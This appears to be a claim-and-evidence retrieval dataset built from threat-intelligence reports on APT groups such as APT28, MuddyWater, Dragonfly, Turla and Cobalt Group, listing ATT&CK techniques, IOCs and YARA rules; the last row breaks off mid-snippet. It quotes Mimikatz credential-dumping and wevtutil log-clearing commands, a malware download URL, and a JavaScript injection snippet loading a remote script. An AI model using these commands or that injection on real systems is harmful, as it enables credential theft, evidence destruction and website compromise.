Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.|0.8974964664370746|"['Adversaries may communicate using application layer protocols Web Protocols T1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Mail Protocols T1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using the Domain Name System DNS T1071.004 (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.', 'Page 44 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may stage collected data in a central location or Data Staged T1074 directory prior to Exfiltration.', 'Adversaries may obtain and abuse credentials of existing Valid Accounts T1078 accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.', 'Adversaries may enumerate files and directories or may search in File and Directory T1083 specific locations of a host or network share for certain Discovery information within a file system.', 'To disguise the source of malicious traffic, adversaries may chain Multi-hop Proxy T1090.003 together multiple proxies.', 'Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.']"
The group also searched a compromised DCCC computer for specific terms.|1.0|"['[22]EnterpriseT1211Exploitation for Defense EvasionAPT28has used CVE-2015-4902 to bypass security features.', '[38][33]EnterpriseT1068Exploitation for Privilege EscalationAPT28has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.', '[38][33][22]EnterpriseT1210Exploitation of Remote ServicesAPT28exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.', '[6][39][40]EnterpriseT1133External Remote ServicesAPT28has usedTorand a variety of commercial VPN services to route brute force authentication attempts.', '[2]EnterpriseT1083File and Directory DiscoveryAPT28has usedForfilesto locate PDF, Excel, and Word documents during collection.', 'The group also searched a compromised DCCC computer for specific terms.', ""[35][3]EnterpriseT1589.001Gather Victim Identity Information:CredentialsAPT28has harvested user's login credentials."", '[31]EnterpriseT1564.001Hide Artifacts:Hidden Files and DirectoriesAPT28has saved files with hidden file attributes.', '[18][18].003Hide Artifacts:Hidden WindowAPT28has used the WindowStyle parameter to concealPowerShellwindows.', '[11][41]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsAPT28has cleared event logs, including by using the commandswevtutil cl Systemandwevtutil cl Security.', '[5][3].004Indicator Removal:File DeletionAPT28has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.']"
"MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET."""|0.8059028392895468|['The upload command downloads files from the CnC and saves them locally in C:\\\ProgramData.', '6.', 'The clean command destroys the victims disk drives C, D, E, F and then reboots.', '7.', 'The reboot and shutdown commands immediately reboot and shut down the victims machine.', 'In one version of the malware, the code checks if the ProgramData folder has folders or files with the keywords Kasper, Panda, or ESET.', '7/12Victimology 8/12Most victims of MuddyWater were found in Jordan, Turkey, Iraq, Pakistan, Saudi Arabia, Afghanistan and Azerbaijan.', 'Other victims were also recorded in Russia, Iran, Bahrain, Austria and Mali.', 'The malicious decoy documents used in the attacks suggest they are geopolitically motivated, targeting sensitive personnel and organizations.', 'Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes.', 'Multiple documents used in the attacks also contain embedded paths from their authors machines.']
"MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET."""|0.9036433940716841|"['Credentials: Credentials In Files Discovery System Network T1016 MuddyWater has used malware to collect the victims IP address and domain name.', 'Configuration Discovery System Owner/User T1033 MuddyWater has used malware that can collect the victims username.', 'Discovery System Network T1049 MuddyWater has used a PowerShell backdoor to check for Skype connections on Connections the target machine.', 'Discovery Process Discovery T1057 MuddyWater has used malware to obtain a list of running processes on the system.', 'System Information T1082 MuddyWater has used malware that can collect the victims OS version and machine Discovery name.', 'File and Directory T1083 MuddyWater has used malware that checked if the ProgramData folder had folders Discovery or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.""', 'Account Discovery: T1087.002 MuddyWater has used cmd.exe net user/domain to enumerate domain users.', 'Domain Account Software Discovery T1518 MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.', 'Security Software T1518.001 MuddyWater has used malware to check running processes against a hard-coded Discovery list of security tools often used by malware researchers.', 'Collection Screen Capture T1113 MuddyWater has used malware that can capture screenshots of the victims machine.', 'Archive Collected T1560.001 MuddyWater has used the native Windows cabinet creation tool, makecab.exe , Data: Archive via likely to compress stolen data to be uploaded.']"
"MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET."""|0.7724733410933554|"['[11][16][4][8]EnterpriseT1573.001Encrypted Channel:Symmetric CryptographyMuddyWaterhas used AES to encrypt C2 responses.', '[8]EnterpriseT1041Exfiltration Over C2 ChannelMuddyWaterhas used C2 infrastructure to receive exfiltrated data.', '[6]EnterpriseT1190Exploit Public-Facing ApplicationMuddyWaterhas exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).', '[7]EnterpriseT1203Exploitation for Client ExecutionMuddyWaterhas exploited the Office vulnerability CVE-2017-0199 for execution.', '[5]EnterpriseT1210Exploitation of Remote ServicesMuddyWaterhas exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).', '[7]EnterpriseT1083File and Directory DiscoveryMuddyWaterhas used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.', '""[14]EnterpriseT1574.002Hijack Execution Flow:DLL Side-LoadingMuddyWatermaintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.', ""[7]EnterpriseT1562.001Impair Defenses:Disable or Modify ToolsMuddyWatercan disable the system's local proxy settings."", '[9]EnterpriseT1105Ingress Tool TransferMuddyWaterhas used malware that can upload additional files to the victims machine.', '[14][4][6][9]EnterpriseT1559.001Inter-Process Communication:Component Object ModelMuddyWaterhas used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.', '[14][5][7].002Inter-Process Communication:Dynamic Data ExchangeMuddyWaterhas used malware that can execute PowerShell scripts via DDE.']"
Dragonfly 2.0 has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.|0.8013266223570882|['[15]EnterpriseT1190Exploit Public-Facing ApplicationDragonflyhas conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.', '[8]EnterpriseT1203Exploitation for Client ExecutionDragonflyhas exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.', '[7]EnterpriseT1210Exploitation of Remote ServicesDragonflyhas exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.', '[8]EnterpriseT1133External Remote ServicesDragonflyhas used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.', '[15][8]EnterpriseT1083File and Directory DiscoveryDragonflyhas used a batch script to gather folder and file names from victim hosts.', '[15][7][8]EnterpriseT1187Forced AuthenticationDragonflyhas gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.', '[15][7]EnterpriseT1591.002Gather Victim Org Information:Business RelationshipsDragonflyhas collected open source information to identify relationships between organizations for targeting purposes.', '[7]EnterpriseT1564.002Hide Artifacts:Hidden UsersDragonflyhas modified the Registry to hide created user accounts.', '[15]EnterpriseT1562.004Impair Defenses:Disable or Modify System FirewallDragonflyhas disabled host-based firewalls.', 'The group has also globally opened port 3389.', '[15]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsDragonflyhas cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs.']
While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access.|0.8961421965517162|"['Exploit Public-Facing Application.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1190/ 3 MITRE.', '(May 31, 2017).', 'External Remote Services.', 'Accessed May 13, 2020 at: https://attack.mitre.org/techniques/T1133/ TLP: WHITE, ID#202006091030 10TTPs Hardware Additions 1 Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access.', 'While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access.', 'Commercial and open source products are leveraged with capabilities such as passive network tapping, man-in-the middle encryption breaking, keystroke injection, kernel memory reading via DMA, adding new wireless access to an existing network, and others.', 'Replication Through Removable Media 2 Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes.', 'In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system.', ""In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself."", 'Spearphishing Attachment 3 Spearphishing attachment is a specific variant of spearphishing.']"
To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a hidden file.|0.8670669897926855|['Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.', 'T1024 Custom Adversaries may use a custom cryptographic protocol or algorithm Cryptographic to hide command and control traffic.', 'A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. All rights reserved 23 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal command and control traffic rather than relying on any Protocol inherent protections provided by a communication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.', 'T1158 Hidden Files To prevent normal users from accidentally changing special files on and Directories a system, most operating systems have the concept of a hidden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line.', 'Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).', 'T1222 File and File and directory permissions are commonly managed by Directory discretionary access control lists (DACLs) specified by the file or Permissions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).', 'Copyright Leonardo S.p.a. All rights reserved 24 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 7.']
Users must explicitly ask to show the hidden files either via a series of Graphical User Interface prompts or with command line switches .|0.8378414312329782|"['A simple scheme, such as Protocol XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.', 'Copyright Leonardo S.p.a. All rights reserved 23 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 T1032 Standard Adversaries may explicitly employ a known encryption algorithm to Cryptographic conceal command and control traffic rather than relying on any Protocol inherent protections provided by a communication protocol.', 'Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.', 'T1158 Hidden Files To prevent normal users from accidentally changing special files on and Directories a system, most operating systems have the concept of a hidden file.', 'These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line.', 'Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).', 'T1222 File and File and directory permissions are commonly managed by Directory discretionary access control lists (DACLs) specified by the file or Permissions directory owner.', 'File and directory DACL implementations may vary Modification by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.).', 'Copyright Leonardo S.p.a. All rights reserved 24 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 7.', 'INDICATORS OF COMPROMISE Hashes 1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905 8dc3d053e5008ab92a17dc47fed43213a9873db0 0994d9deb50352e76b0322f48ee576c6 3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4 04686b0d2fdafa7cb6c17adc551abade334d7b85 14ecd5e6fc8e501037b54ca263896a11 8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667 7f043eb95d74d051ac780aee52ebf1c497c43060 19fbd8cbfb12482e8020a887d6427315 2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08 4594453e2e4002101481dc44f203d3ffebe079ae edf900cebb70c6d1fcab0234062bfc28 5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8 09580f1deb096bb50d082bd169271d41756adf73 ea06b213d5924de65407e8931b1e4326 d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0 9d133d7e0616573a7d1c822cc878149e7aa7bad6 e079ec947d3d4dacb21e993b760a65dc 8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc 0675329cfa4d13ee35f74c1cc236bc630b7de464 ad6731c123c4806f91e1327f35194722 67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502 f5a1a9180913bbeb1641af48660fbb756325f91e b4587870ecf51e8ef67d98bb83bc4be7 d9f2467ff11efae921ec83e074e4f8d2eac7881d76bff60a872a801bd45ce3d5 c67abb20ae5100f12ce084279827632fdbcb222a 7533ef5300263eec3a677b3f0636ae73 Copyright Leonardo S.p.a. All rights reserved 25 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 Yara Rules rule APT_MAL_LNX_Turla_Apr202004_1 { meta: description = ""Detects Turla Linux malware x64 x32"" date = ""2020-04-24"" hash1 = ""67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"" hash2 = ""8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"" hash3 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash4 = ""1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"" hash5 = ""2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"" hash6 = ""3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"" hash7 = ""5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"" hash8 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash9 = ""d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"" strings: $s1 = ""/root/.hsperfdata"" ascii fullword $s2 = ""Desc| Filename | size |state|"" ascii fullword $s3 = ""VS filesystem: %s"" ascii fullword $s4 = ""File already exist on remote filesystem !""', 'ascii fullword $s5 = ""/tmp/.sync.pid"" ascii fullword $s6 = ""rem_fd: ssl "" ascii fullword $s7 = ""TREX_PID=%u"" ascii fullword $s8 = ""/tmp/.xdfg"" ascii fullword $s9 = ""__we_are_happy__"" ascii fullword $s10 = ""/root/.sess"" ascii fullword $s11 = ""ZYSZLRTS^Z@@NM@@G_Y_FE"" ascii fullword condition: uint16(0) == 0x457f and filesize < 5000KB and 4 of them } Copyright Leonardo S.p.a. All rights reserved 26 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 rule APT_MAL_LNX_Turla_Apr202004_1_opcode { meta: description = ""Detects Turla Linux malware x64 x32"" date = ""2020-04-24"" hash1 = ""67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"" hash2 = ""8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"" hash3 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash4 = ""1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"" hash5 = ""2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"" hash6 = ""3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"" hash7 = ""5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"" hash8 = ""8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"" hash9 = ""d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"" strings: $op0 = { 8D 41 05 32 06 48 FF C6 88 81 E0 80 69 00 } /* Xor string loop_p1 x32*/ $op1 = { 48 FF C1 48 83 F9 49 75 E9 } /* Xor string loop_p2 x32*/ $op2 = { C7 05 9B 7D 29 00 1D 00 00 00 C7 05 2D 7B 29 00 65 74 68 30 C6 05 2A 7B 29 00 00 E8 } /* Load eth0 interface*/ $op3 = { BF FF FF FF FF E8 96 9D 0A 00 90 90 90 90 90 90 90 90 90 90 89 F0} /* Opcode exceptions*/ $op4 = { 88 D3 80 C3 05 32 9A C1 D6 0C 08 88 9A 60 A1 0F 08 42 83 FA 08 76 E9 } /* Xor string loop x64*/ $op5 = { 8B 8D 50 DF FF FF B8 09 00 00 00 89 44 24 04 89 0C 24 E8 DD E5 02 00 } /* Kill call x32 */ $op6 = { 8D 5A 05 32 9A 60 26 0C 08 88 9A 20 F4 0E 08 42 83 FA 48 76 EB } /* Decrypt init str */ $op7 = { 8D 4A 05 32 8A 25 26 0C 08 88 8A 20 F4 0E 08 42 83 FA 08 76 EB} /* Decrypt init str */ condition: uint16(0) == 0x457f and filesize < 5000KB and 2 of them } Copyright Leonardo S.p.a. All rights reserved 27 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 REFERENCES [1] The Penquin Turla: A Turla/Snake/Uroburos Malware for Linux; by Kurt Baumgartner, Costin Raiu.']"
Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.|0.7810014895083808|['ESET Research white papers TLP: WHITE AT COMMANDS, TOR-BASED COMMUNICATIONS: MEET ATTOR, A FANTASY CREATURE AND ALSO A SPY PLATFORM Author: Zuzana HromcovIn the fantasy book A Court of Thorns and Roses by Sarah J. Maas, Attor was an evil Faerie.', 'In that book, the Faeries ruled over all the known world and humans were their slaves.', 'In cybersecurity, Attor is a cyberespionage platform designed to exfiltrate valuable information from its victims.', 'Author: Zuzana Hromcov October 20191 AT commands, TOR-based communications: Meet Attor, a fantasy creature and also a spy platform TLP: WHITE CONTENTS 1 SUMMARY .', '.', '.', '.', '.', '.', '.']
InvisiMole has executed legitimate tools in hidden windows.|0.7533303627185787|['ESET Research white papers TLP: WHITE INVISIMOLE: THE HIDDEN PART OF THE STORY UNEARTHING INVISIMOLES ESPIONAGE TOOLSET AND STRATEGIC COOPERATIONS Authors: Zuzana Hromcov Anton CherepanovTLP: WHITE 2 InvisiMole: The hidden part of the story CONTENTS 1 EXECUTIVE SUMMARY  4 2 ATTACKS AND INVESTIGATION  4 2.1 InvisiMoles toolset .', '.', '.', '.', '.', '.', '.']
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.|0.7527455642990353|['Telsy SpA - TLP : WHITE 8 December 03, 2020...', 'Credits Telsy internal research team has been supported by the collaboration of several independent security researchers during the acquisition and analysis phases of parts of the artifacts and evidences collected.', 'Among these we thank Vito Alfano (@vxsh4d0w) for his precious support and collaboration.', 'Indicators of Compromise Type Value sha256 d9335a58ec7d9016258640393f0cedf4a574ae6bf9e262772ac0b21be1b3f160 sha256 25b747c5b79774e91f72f07b81819b9d1548d958247b81a72dca223cda2182b0 sha256 168cddae42f300dbf9a398a79ed28f7d18d35791b02f13b14509e4a8c23b5a9b sha256 907040c91f9b0dbe13ce4b1fc5b96774a578625a1b023684ef78d1c16b6e89ce sha256 2fb00f8374b1b111ed9061a709b35c8cbfa8ad60bf27669c5a1a77385af514c1 sha256 ba27b84be509f5707480a79966f02ee8a976baac8e68793a8ce9cf35ed9be0fd sha256 3943281b88b1c4d3afabc6f0db027b3933a0b3dcf22c13bd37103fa33d851d13 sha256 7dd928a1dbfb9e75e2c8832736810e328b2f6e8203dbf19c35edbcebb22a108a sha256 cbccebda97f3a276ac939e5e1502630e4cf981eb9c16dd80dddc3b6517d4d272 sha256 814c32d56b92bf4eca814173f27b46d0b9eb21cc76f356a17af01416f04bf691 sha256 9d0872926896a0efc6f5e2dc9ac2c7c62d1c29837b238daab47515fcc43a8e51 sha256 ab84cfaadbedc68ed1a9bcdd5b43cc1f64ce4a60e14d0a8b7eaada88dc99f896 sha256 fca6883b6508568056870e73b092d979af35f79b0665ff62c078909187c87eee sha256 02e069ca6d3d262d8e663981a1ace8aba1e44c1106e5c1f434b05e80f2eef19b sha256 26345084cbd7f3571599ead41cde209b46e5a9633b4b6d0e4c5ba379d3ffa4b8 sha256 cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416 sha256 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587 sha256 2d31a07b636024d8dbf8fc1533c7af7ee9720886995c001ba9a701f3a90f007c sha256 7f7041f099dec8c842ac0225e505bbf51d0a4bf6f1440b5ec7b2d10ebd894d05 sha256 36a03ce4571347cee90c03067e2bae39ad80d597c8b40c430b37e4d6be96210e sha256 9e57f7e41d281935cc912f8d7066a6158071b1a79897455ce66cd17c5dd34f95 hostname mail.loanabank.com hostname mail.dledcardetails.pt hostname smtp.opw-global.com Telsy SpA - TLP : WHITE 9 December 03, 2020... hostname mail.bestelectricpanels.com domain cannabispropertybrokers.com domain colchoeslowcost.pt domain poptateseatery.com domain opw-global.com url https://cannabispropertybrokers.com/pop/8OwWKrFQ0gQoKt9.exe email biyou.packing@msa.hinet.net email smtp-2hn19@colchoeslowcost.pt email biyou.packing@msa.hinet.net email smtp-gxlj9@mchepuko.com email hackerteam@c21affiliated.com email wilson_yh@yeah.net email sebastian@amzcomplete.de email info@loanabank.com email wang@hfsr88.com email hugo@beanboom.cn email opwes.insidesales@opw-global.com email sean.barker@opw-global.com email cahya.lesmana@muarainternusa.com email davidloureiro@dledcardetails.pt email comunicaciones@samucongresos.es email administracion@bers.com.mx email info@almoosa-oam.com email dombotenisz@dombotenisz.hu email loureiro@dledcardetails.pt email corporate@hitechpeopleinc.com email careers@ghrc-bk.org email hayley@babygrowmemories.co.uk email info@makbes.com email jdean@itcmanagementsolutions.com email sales@globalelektrindo.com email marketing@nscmhmedicalcentre.com email fbwqv@aba-online.org.ar email info@fisicalmente.it email info@makbes.com Telsy SpA - TLP : WHITE 10 December 03, 2020... email anonymousfox-qxyb5@milanmandiri.com email info@berolahraga.com MITRE ATT&CK Technique Tactic Description T1566 Initial Access Threat actor uses phishing email with a malicious attachment to gain access to the internal network T1204 Execution Threat actor relies upon specific actions by a user in order to gain execution T1547 Persistence Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1547 Privilege Escalation Threat actor configures system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.', 'T1564 Defense Evasion Threat actor may attempt to hide artifacts associated with their behaviors to evade detection.', 'T1562.001 Defense Evasion Threat actor may disable security tools to avoid possible detection of their tools and activities.', 'Threat actor may use obfuscated files or T1140 Defense Evasion information to hide artifacts of an intrusion.', 'Adversaries may communicate using application layer protocols associated with web traffic to Command and Control T1071.001 avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols associated with electronic mail T1071.003 Command and Control delivery to avoid detection/network filtering by blending in with existing traffic.', 'Telsy SpA - TLP : WHITE 11 December 03, 2020... T1132 Command and Control Command and control (C2) information is encoded using a standard data encoding system T1056.001 Collection Threat actor may log user keystrokes to intercept credentials as the user types them.']
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.|0.7789649486848762|"['Account Manipulation T1098 SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.', 'Table 6: SVR Cyber Actors ATT&CK Techniques for Enterprise: Defense Evasion Technique Title ID Use Obfuscated Files or Information: T1027.001 SVR cyber actors use BMPs to Binary Padding perform binary padding while exchange data is exfiltrated to an their C2 station.', 'Page 10 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership Masquerading T1036 SVR cyber actors use a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to- detect access) and a variant that masks itself within vcperf, an open- source C++ build analysis tool from Microsoft.', 'Process Injection T1055 SVR cyber actors inject code into AV and EDR processes to evade defenses.', 'Disable or Modify Tools T1562.001 SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.', 'Hide Artifacts T1564 SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.', 'Hide Artifacts: Hidden Files and T1564.001 When communicating with cloud Directories services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.', 'Table 7: SVR Cyber actors ATT&CK Techniques for Enterprise: Credential Access Technique Title ID Use OS Credential Dumping: LSASS T1003.001 SVR cyber actors executed Mimikatz Memory commands in memory to gain access to credentials stored in memory.', 'OS Credential Dumping: Security T1003.002 SVR cyber actors used: Account Manager privilege::debug lsadump::cache lsadump::secrets lsadump::sam sekurlsa::logonpasswords Mimikatz commands to gain access to credentials.', 'Additionally, SVR cyber actors Page 11 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership exfiltrated Windows registry hives to steal credentials.', 'HKLM\\\SYSTEM HKLM\\\SAM HKLM\\\SECURITY Credentials from Password T1555.003 In a few specific cases, the SVR Stores: Credentials from Web used the SharpChromium tool to Browsers obtain sensitive browser data such as session cookies, browsing history, or saved logins.']"
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.|0.8855941549876555|"['Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.', 'Inter-Process Adversaries may abuse inter-process communication (IPC) T1559 Communication mechanisms for local code or command execution.', 'An adversary may compress and/or encrypt data that is collected Archive Collected Data T1560.003 prior to exfiltration.', 'Adversaries may attempt to hide artifacts associated with their Hide Artifacts T1564 behaviors to evade detection.', 'Adversaries may abuse the Windows service control manager to Service Execution T1569.002 execute malicious commands or payloads.', 'Adversaries may transfer tools or other files between systems in Lateral Tool Transfer T1570 a compromised environment.', 'Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid Protocol Tunneling T1572 detection/network filtering and/or enable access to otherwise unreachable systems.', 'Adversaries may employ a known encryption algorithm to conceal Encrypted Channel T1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.', 'Adversaries may employ a known symmetric encryption algorithm Symmetric Cryptography T1573.001 to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.']"
The group's JavaScript backdoor is also capable of downloading files.|1.0|"['[4]EnterpriseT1573.002Encrypted Channel:Asymmetric CryptographyCobalt Grouphas used the Plink utility to create SSH tunnels.', '[4]EnterpriseT1203Exploitation for Client ExecutionCobalt Grouphad exploited multiple vulnerabilities for execution, including Microsofts Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.', '[1][2][3][5][6][7][10][12]EnterpriseT1068Exploitation for Privilege EscalationCobalt Grouphas used exploits to increase their levels of rights and privileges.', '[4]EnterpriseT1070.004Indicator Removal:File DeletionCobalt Groupdeleted the DLL dropper from the victims machine to cover their tracks.', '[1]EnterpriseT1105Ingress Tool TransferCobalt Grouphas used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.', ""[2][3]The group's JavaScript backdoor is also capable of downloading files."", '[11]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangeCobalt Grouphas sent malicious Word OLE compound documents to victims.', '[1]EnterpriseT1046Network Service DiscoveryCobalt Groupleveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.', '[2][3][4]EnterpriseT1027.010Obfuscated Files or Information:Command ObfuscationCobalt Groupobfuscated several scriptlets and code used on the victims machine, including through use of XOR and RC4.', '[1][11]EnterpriseT1588.002Obtain Capabilities:ToolCobalt Grouphas obtained and used a variety of tools includingMimikatz,PsExec,Cobalt Strike, andSDelete.', '[3]EnterpriseT1566.001Phishing:Spearphishing AttachmentCobalt Grouphas sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations.']"
JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application pages.|0.7672103347644436|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) 